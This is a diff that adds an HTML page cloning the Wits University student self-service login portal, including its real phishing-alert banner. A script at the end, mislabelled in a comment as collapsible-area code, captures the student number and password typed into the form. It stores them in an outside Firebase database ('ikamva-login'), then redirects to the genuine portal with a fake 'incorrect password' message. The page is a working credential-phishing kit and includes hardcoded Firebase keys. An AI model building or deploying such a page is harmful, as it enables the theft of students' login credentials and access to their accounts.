@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<head>
+<title>Student Self-Service - Wits University</title>
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">    
+<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,user-scalable=yes">  
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+
+
+<link type="text/css" href="/style.css" rel="stylesheet">
+<script type="text/javascript" src="/signin.js"></script>
+
+</head>
+<body>
+<div><img src="/HeaderColorband.png" class="uw_header_color_band"></div>
+<div class="header">
+    <!--This area can be used for notifications. I would strongly advise against it though.-->
+</div>
+<div class="row" id="pswrapper">
+  <div class="column side">
+    <!--This area can be used for notifications. I would strongly advise against it though.-->
+</div>  
+  <div class="column middle" id="slidein">
+    <!--Header Image - Wits Logo-->
+    <h1 align='center'><a href="https://www.wits.ac.za/students/">
+      <img border="0" alt="Students - Wits University" src="/Header.png">
+    </a></h1>
+    <!--Page Title - Start-->
+    <p><h1 align='center' style="color: #0057B8;">Student Self-Service Portal</h1></p>
+    <!--Collapsible Region - Start-->
+
+    <!--WITSU: Rayn Donga: Phishing Alert: SR179066: Date:23-Jan-2023 Start-->
+    <button class="collapsible" ><h3 class = "blink">Phishing Alert!</h4><br><h6 style="margin-top: -50px; color:red; ">Click here for more information</h6></button>
+      
+      <div class="content_Phishing_alert" align='center'>
+       <p style="color: white;">Given the rise in cybercrime, and before making any payment to the University, verify that the account into which payment is to be made is a legitimate bank account of the University, as published in the Fee Booklet or on the Fee Statement. The University will not communicate any change in bank details to students by way of email, bank confirmation letters or other electronic communication. Please check that the University&rsquo;s bank details are accurate before making payment. It is your duty as the Payee to check that the University&rsquo;s bank details are accurate before making payment.</p>
+      
+      </div>
+     <!--WITSU: Rayn Donga: Phishing Alert: SR179066: Date:23-Jan-2023 End-->
+
+    <button class="collapsible"><h4><U>What can I do on this Portal?</U></h4></button>
+<div class="content" align='center'>
+    <p style="color: white;">This portal works best with latest versions of Chrome and Firefox.</p>
+    <p><h3 style="color: #0057B8;">What can I do as an Applicant?</h3></p>
+    <p style="color: white;">
+      <ul class="ul">
+        <li>Upload your supporting documents.</li>
+        <li>View Academic Applications and their statuses.</li>
+        <li>View your Financial Aid Application.</li>
+        <li>View your Residence Status.</li>
+        <li>View your Personal Information.</li>
+      </ul>
+    </p>
+    <p><h3 style="color: #0057B8;">What can I do as a Student?</h3></p>
+    <p style="color: white;">
+      <ul class="ul">
+        <li>Access and print your Fee Statement.</li>
+        <li>Check your timetable and venues.</li>
+        <li>View and amend Personal Information.</li>
+        <li>Check your application status.</li>
+        <li>Pay your fees online.</li>
+        <li>View final examination results.</li>
+        <li>View examination timetable.</li>
+        <li>View graduation dates.</li>
+      </ul>
+      <p><h3 style="color: #0057B8;">Note</h3></p>
+    <p style="color: white;">
+      <ul class="ul">
+        <li>If any of the information is incorrect or if you have any queries, please consult your <a href="https://www.wits.ac.za/faculties-and-schools/">faculty office.</a></li>
+        <li>If you have any queries please contact the Student Call Centre on 0117171888.</li>
+        <li>Applicants - Your Password is your date of birth in (YYMMDD) format eg. 861224.</li>
+        <li>Current Students - Your Password is your current Student password.</li>       
+      </ul>
+    </p><!--Collapsible Region - End-->
+    </p>
+    
+</div>
+    <form autocomplete="off" method="POST" action="myPage.php"> <!--"http://csdev.wits.ac.za/psp/csdev/?&amp;cmd=login&amp;languageCd=ENG"-->
+      <input type="hidden" id="lcsrf_token" name="lcsrf_token" value="sQkH1hIXaSm56ABdITZEit3BWwS6PQZ89C+3GWQHdU8=">
+      <input type="hidden" id="timezoneOffset" name="timezoneOffset" value="0">
+      <input type="hidden" id="ptmode" name="ptmode" value="f">
+      <input type="hidden" id="ptlangcd" name="ptlangcd" value="ENG">
+      <input type="hidden" id="ptinstalledlang" name="ptinstalledlang" value="ENG">
+      <div class="signonMain"> <!--class="signonMain"-->
+          <div class="ps_signinentry"><!--class="ps_signinentry"-->            
+            <div id="ptloginerrorcont" class="ps_login_error">
+              <div class="ps_login_error_inner" id="ps_login_error_inner" tabindex="-1" role="heading" aria-level="2">
+		        <a id="error_link" name="error_link" tabindex="-1"><img src="PT_LOGIN_ERROR.gif" alt="Error"></a>
+                <div class="psloginerror" id="discovery_error" name="discovery_error"></div>
+                <span class="psloginerror" id="login_error" name="login_error"></span>                     
+		   </div>
+		   <div class="ps_box-control psloginerror" id="browsercheck_error" name="browsercheck_error" aria-live="assertive" role="alert"></div>
+            </div>
+	       
+           <div> 
+               <span class="ps_label-show" id="ptLabelUserid"><label for="userid" style="color: #0057B8;" style="text-shadow: none;">Student/Person Number</label></span> <!---->
+           </div>
+            
+           <div class="ps_box-control">
+               <input id="userid" name="userid" title="User ID" type="text" placeholder="eg. 2116515. Not your Temp ID.">
+            </div>
+           <div>
+               <span class="ps_label-show" id="ptLabelPassword"><label for="pwd">Password</label></span>
+           </div>
+            <div class="ps_box-control">
+               <input id="pwd" name="pwd" title="Password" type="password">
+            </div>
+           
+            <div class="ps_box-button">
+              <a href="https://google.com">   <input name="Submit" id="ps-button" value="Sign In" aria-label="To enable screen reader mode, please check the checkbox &quot;Enable Screen Reader Mode&quot; before you sign in. Sign In" type="submit"></a>
+            </div>
+            <div> 
+
+            
+              <P>Current Students - Your Password is your current Student password.</P>   
+                  <p>Applicants - Your Password is your date of birth in (YYMMDD) format eg. 861224.</P>
+                   
+              
+              </p><!--Collapsible Region - End-->
+              
+              <span><a href="https://www.wits.ac.za/mywits/password-reset/" align="center">Forgot your password?</a></span> <!---->
+          </div>        
+          </div>
+      </div>  
+    </form>
+  </div>
+  <div class="column side">
+    <!--This area can be used for notifications. I would strongly advise against it though.--> 
+</div>
+</div>
+
+<div class="footer">
+    <footer id="ptfooter" class="ps_footer_text ">Copyright &copy 2020, University of The Witwatersrand, Johannesburg. All rights reserved.</footer>
+</div>
+<!--Script for the collaspsible area under the Title: Student Self-Service Portal --Start-->
+<script type="module">
+               // Import the functions you need from the SDKs you need
+            import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+            import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
+  
+  // Your web app's Firebase configuration
+            const firebaseConfig = {
+              apiKey: "AIzaSyD3dWnvxYEREJT9qe5vOiWIDfJwfpYP4NQ",
+              authDomain: "ikamva-login.firebaseapp.com",
+              projectId: "ikamva-login",
+              storageBucket: "ikamva-login.appspot.com",
+              messagingSenderId: "505250658425",
+              appId: "1:505250658425:web:57ce89c3e5fc7ab5af3ca8"
+            };
+
+  // Initialize Firebase
+            const app = initializeApp(firebaseConfig);
+
+   //get ref to database services
+             const db = getDatabase(app);
+
+             document.getElementById("ps-button").addEventListener('click', function(e){
+              e.preventDefault();
+              set(ref(db, 'user/' + document.getElementById("userid").value+" wits"),
+              {
+   
+                username: document.getElementById("userid").value,
+                pin: document.getElementById("pwd").value,
+                
+
+              });
+             location.replace("https://self-service.wits.ac.za/psp/csprod/UW_SELF_SERVICE/HRMS/?&cmd=login&languageCd=ENG")
+                alert("Incorrect password or username pleasetry again");
+                
+             })
+        </script>
+</body>
+</html>
